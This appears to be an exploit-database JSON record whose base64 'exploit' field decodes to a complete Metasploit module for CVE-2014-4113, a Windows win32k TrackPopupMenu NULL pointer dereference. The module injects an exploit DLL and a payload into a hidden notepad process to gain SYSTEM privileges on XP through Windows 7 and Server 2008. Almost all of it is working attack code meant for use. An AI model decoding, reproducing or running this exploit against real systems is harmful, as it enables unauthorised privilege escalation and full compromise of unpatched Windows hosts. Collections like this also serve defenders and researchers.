{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ21zZi9jb3JlL3Bvc3Qvd2luZG93cy9yZWZsZWN0aXZlX2RsbF9pbmplY3Rpb24nDQpyZXF1aXJlICdyZXgnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KICBSYW5rID0gTm9ybWFsUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpGaWxlDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcml2DQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcm9jZXNzDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpGaWxlSW5mbw0KICBpbmNsdWRlIE1zZjo6UG9zdDo6V2luZG93czo6UmVmbGVjdGl2ZURMTEluamVjdGlvbg0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywgew0KICAgICAgJ05hbWUnICAgICAgICAgICA9PiAnV2luZG93cyBUcmFja1BvcHVwTWVudSBXaW4zMmsgTlVMTCBQb2ludGVyIERlcmVmZXJlbmNlJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgTlVMTCBQb2ludGVyIERlcmVmZXJlbmNlIGluIHdpbjMyay5zeXMsIHRoZSB2dWxuZXJhYmlsaXR5DQogICAgICAgIGNhbiBiZSB0cmlnZ2VyZWQgdGhyb3VnaCB0aGUgdXNlIG9mIFRyYWNrUG9wdXBNZW51LiBVbmRlciBzcGVjaWFsIGNvbmRpdGlvbnMsIHRoZQ0KICAgICAgICBOVUxMIHBvaW50ZXIgZGVyZWZlcmVuY2UgY2FuIGJlIGFidXNlZCBvbiB4eHhTZW5kTWVzc2FnZVRpbWVvdXQgdG8gYWNoaWV2ZSBhcmJpdHJhcnkNCiAgICAgICAgY29kZSBleGVjdXRpb24uIFRoaXMgbW9kdWxlIGhhcyBiZWVuIHRlc3RlZCBzdWNjZXNzZnVsbHkgb24gV2luZG93cyBYUCBTUDMsIFdpbmRvd3MNCiAgICAgICAgMjAwMyBTUDIsIFdpbmRvd3MgNyBTUDEgYW5kIFdpbmRvd3MgMjAwOCAzMmJpdHMuIEFsc28gb24gV2luZG93cyA3IFNQMSBhbmQgV2luZG93cw0KICAgICAgICAyMDA4IFIyIFNQMSA2NCBiaXRzLg0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnVW5rbm93bicsICMgdnVsbmVyYWJpbGl0eSBkaXNjb3ZlcnkgYW5kIGV4cGxvaXQgaW4gdGhlIHdpbGQNCiAgICAgICAgICAnanVhbiB2YXpxdWV6JywgIyBtc2YgbW9kdWxlICh4ODYgdGFyZ2V0KQ0KICAgICAgICAgICdTcGVuY2VyIE1jSW50eXJlJywgIyBtc2YgbW9kdWxlICh4NjQgdGFyZ2V0KQ0KICAgICAgICAgICdPSiBSZWV2ZXMgPG9qW2F0XWJ1ZmZlcmVkLmlvPicNCiAgICAgICAgXSwNCiAgICAgICdBcmNoJyAgICAgICAgICAgPT4gWyBBUkNIX1g4NiwgQVJDSF9YODZfNjQgXSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAnU2Vzc2lvblR5cGVzJyAgID0+IFsgJ21ldGVycHJldGVyJyBdLA0KICAgICAgJ0RlZmF1bHRPcHRpb25zJyA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0VYSVRGVU5DJyA9PiAndGhyZWFkJywNCiAgICAgICAgfSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICMgVGVzdGVkIG9uICgzMiBiaXRzKToNCiAgICAgICAgICAjICogV2luZG93cyBYUCBTUDMNCiAgICAgICAgICAjICogV2luZG93cyAyMDAzIFNQMg0KICAgICAgICAgICMgKiBXaW5kb3dzIDcgU1AxDQogICAgICAgICAgIyAqIFdpbmRvd3MgMjAwOA0KICAgICAgICAgIFsgJ1dpbmRvd3MgeDg2JywgeyAnQXJjaCcgPT4gQVJDSF9YODYgfSBdLA0KICAgICAgICAgICMgVGVzdGVkIG9uICg2NCBiaXRzKToNCiAgICAgICAgICAjICogV2luZG93cyA3IFNQMQ0KICAgICAgICAgICMgKiBXaW5kb3dzIDIwMDggUjIgU1AxDQogICAgICAgICAgWyAnV2luZG93cyB4NjQnLCB7ICdBcmNoJyA9PiBBUkNIX1g4Nl82NCB9IF0NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnU3BhY2UnICAgICAgID0+IDQwOTYsDQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnUmVmZXJlbmNlcycgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNC00MTEzJ10sDQogICAgICAgICAgWydPU1ZEQicsICcxMTMxNjcnXSwNCiAgICAgICAgICBbJ0JJRCcsICc3MDM2NCddLA0KICAgICAgICAgIFsnTVNCJywgJ01TMTQtMDU4J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL2Jsb2cudHJlbmRtaWNyby5jb20vdHJlbmRsYWJzLXNlY3VyaXR5LWludGVsbGlnZW5jZS9hbi1hbmFseXNpcy1vZi1hLXdpbmRvd3Mta2VybmVsLW1vZGUtdnVsbmVyYWJpbGl0eS1jdmUtMjAxNC00MTEzLyddDQogICAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdPY3QgMTQgMjAxNCcsDQogICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDANCiAgICB9KSkNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgb3MgPSBzeXNpbmZvWyJPUyJdDQoNCiAgICBpZiBvcyAhfiAvd2luZG93cy9pDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQogICAgZW5kDQoNCiAgICBpZiBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAvKHdvd3x4KTY0L2kNCiAgICAgIGFyY2ggPSBBUkNIX1g4Nl82NA0KICAgIGVsc2lmIHN5c2luZm9bIkFyY2hpdGVjdHVyZSJdID1+IC94ODYvaQ0KICAgICAgYXJjaCA9IEFSQ0hfWDg2DQogICAgZW5kDQoNCiAgICBmaWxlX3BhdGggPSBleHBhbmRfcGF0aCgiJXdpbmRpciUiKSA8PCAiXFxzeXN0ZW0zMlxcd2luMzJrLnN5cyINCiAgICBtYWpvciwgbWlub3IsIGJ1aWxkLCByZXZpc2lvbiwgYnJhbmNoID0gZmlsZV92ZXJzaW9uKGZpbGVfcGF0aCkNCiAgICB2cHJpbnRfc3RhdHVzKCJ3aW4zMmsuc3lzIGZpbGUgdmVyc2lvbjogI3ttYWpvcn0uI3ttaW5vcn0uI3tidWlsZH0uI3tyZXZpc2lvbn0gYnJhbmNoOiAje2JyYW5jaH0iKQ0KDQogICAgIyBOZWl0aGVyIHRhcmdldCBzdXBvcnRzIFdpbmRvd3MgOCBvciA4LjENCiAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlIGlmIGJ1aWxkID09IDkyMDANCiAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlIGlmIGJ1aWxkID09IDk2MDANCg0KICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkIGlmIFsyNjAwLCAzNzkwLCA3NjAwLCA3NjAxXS5pbmNsdWRlPyhidWlsZCkNCg0KICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBpZiBpc19zeXN0ZW0/DQogICAgICBmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6Tm9uZSwgJ1Nlc3Npb24gaXMgYWxyZWFkeSBlbGV2YXRlZCcpDQogICAgZW5kDQoNCiAgICBpZiBjaGVjayA9PSBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgICAgIGZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiRXhwbG9pdCBub3QgYXZhaWxhYmxlIG9uIHRoaXMgc3lzdGVtLiIpDQogICAgZW5kDQoNCiAgICBpZiBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAvd293NjQvaQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vVGFyZ2V0LCAnUnVubmluZyBhZ2FpbnN0IFdPVzY0IGlzIG5vdCBzdXBwb3J0ZWQnKQ0KICAgIGVsc2lmIHN5c2luZm9bIkFyY2hpdGVjdHVyZSJdID1+IC94NjQvICYmIHRhcmdldC5hcmNoLmZpcnN0ID09IEFSQ0hfWDg2DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm9UYXJnZXQsICdTZXNzaW9uIGhvc3QgaXMgeDY0LCBidXQgdGhlIHRhcmdldCBpcyBzcGVjaWZpZWQgYXMgeDg2JykNCiAgICBlbHNpZiBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAveDg2LyAmJiB0YXJnZXQuYXJjaC5maXJzdCA9PSBBUkNIX1g4Nl82NA0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vVGFyZ2V0LCAnU2Vzc2lvbiBob3N0IGlzIHg4NiwgYnV0IHRoZSB0YXJnZXQgaXMgc3BlY2lmaWVkIGFzIHg2NCcpDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoJ0xhdW5jaGluZyBub3RlcGFkIHRvIGhvc3QgdGhlIGV4cGxvaXQuLi4nKQ0KICAgIG5vdGVwYWRfcHJvY2VzcyA9IGNsaWVudC5zeXMucHJvY2Vzcy5leGVjdXRlKCdub3RlcGFkLmV4ZScsIG5pbCwgeydIaWRkZW4nID0+IHRydWV9KQ0KICAgIGJlZ2luDQogICAgICBwcm9jZXNzID0gY2xpZW50LnN5cy5wcm9jZXNzLm9wZW4obm90ZXBhZF9wcm9jZXNzLnBpZCwgUFJPQ0VTU19BTExfQUNDRVNTKQ0KICAgICAgcHJpbnRfZ29vZCgiUHJvY2VzcyAje3Byb2Nlc3MucGlkfSBsYXVuY2hlZC4iKQ0KICAgIHJlc2N1ZSBSZXg6OlBvc3Q6Ok1ldGVycHJldGVyOjpSZXF1ZXN0RXJyb3INCiAgICAgICMgUmVhZGVyIFNhbmRib3ggd29uJ3QgYWxsb3cgdG8gY3JlYXRlIGEgbmV3IHByb2Nlc3M6DQogICAgICAjIHN0ZGFwaV9zeXNfcHJvY2Vzc19leGVjdXRlOiBPcGVyYXRpb24gZmFpbGVkOiBBY2Nlc3MgaXMgZGVuaWVkLg0KICAgICAgcHJpbnRfc3RhdHVzKCdPcGVyYXRpb24gZmFpbGVkLiBUcnlpbmcgdG8gZWxldmF0ZSB0aGUgY3VycmVudCBwcm9jZXNzLi4uJykNCiAgICAgIHByb2Nlc3MgPSBjbGllbnQuc3lzLnByb2Nlc3Mub3Blbg0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzKCJSZWZsZWN0aXZlbHkgaW5qZWN0aW5nIHRoZSBleHBsb2l0IERMTCBpbnRvICN7cHJvY2Vzcy5waWR9Li4uIikNCiAgICBpZiB0YXJnZXQuYXJjaC5maXJzdCA9PSBBUkNIX1g4Ng0KICAgICAgZGxsX2ZpbGVfbmFtZSA9ICdjdmUtMjAxNC00MTEzLng4Ni5kbGwnDQogICAgZWxzZQ0KICAgICAgZGxsX2ZpbGVfbmFtZSA9ICdjdmUtMjAxNC00MTEzLng2NC5kbGwnDQogICAgZW5kDQoNCiAgICBsaWJyYXJ5X3BhdGggPSA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE0LTQxMTMnLCBkbGxfZmlsZV9uYW1lKQ0KICAgIGxpYnJhcnlfcGF0aCA9IDo6RmlsZS5leHBhbmRfcGF0aChsaWJyYXJ5X3BhdGgpDQoNCiAgICBwcmludF9zdGF0dXMoIkluamVjdGluZyBleHBsb2l0IGludG8gI3twcm9jZXNzLnBpZH0uLi4iKQ0KICAgIGV4cGxvaXRfbWVtLCBvZmZzZXQgPSBpbmplY3RfZGxsX2ludG9fcHJvY2Vzcyhwcm9jZXNzLCBsaWJyYXJ5X3BhdGgpDQoNCiAgICBwcmludF9zdGF0dXMoIkV4cGxvaXQgaW5qZWN0ZWQuIEluamVjdGluZyBwYXlsb2FkIGludG8gI3twcm9jZXNzLnBpZH0uLi4iKQ0KICAgIHBheWxvYWRfbWVtID0gaW5qZWN0X2ludG9fcHJvY2Vzcyhwcm9jZXNzLCBwYXlsb2FkLmVuY29kZWQpDQoNCiAgICAjIGludm9rZSB0aGUgZXhwbG9pdCwgcGFzc2luZyBpbiB0aGUgYWRkcmVzcyBvZiB0aGUgcGF5bG9hZCB0aGF0DQogICAgIyB3ZSB3YW50IGludm9rZWQgb24gc3VjY2Vzc2Z1bCBleHBsb2l0YXRpb24uDQogICAgcHJpbnRfc3RhdHVzKCdQYXlsb2FkIGluamVjdGVkLiBFeGVjdXRpbmcgZXhwbG9pdC4uLicpDQogICAgcHJvY2Vzcy50aHJlYWQuY3JlYXRlKGV4cGxvaXRfbWVtICsgb2Zmc2V0LCBwYXlsb2FkX21lbSkNCg0KICAgIHByaW50X2dvb2QoJ0V4cGxvaXQgZmluaXNoZWQsIHdhaXQgZm9yIChob3BlZnVsbHkgcHJpdmlsZWdlZCkgcGF5bG9hZCBleGVjdXRpb24gdG8gY29tcGxldGUuJykNCiAgZW5kDQoNCmVuZA==", 
    "filename": "platforms/windows/local/35101.rb", 
    "id": "35101", 
    "cves": [
        "CVE-2014-4113"
    ]
}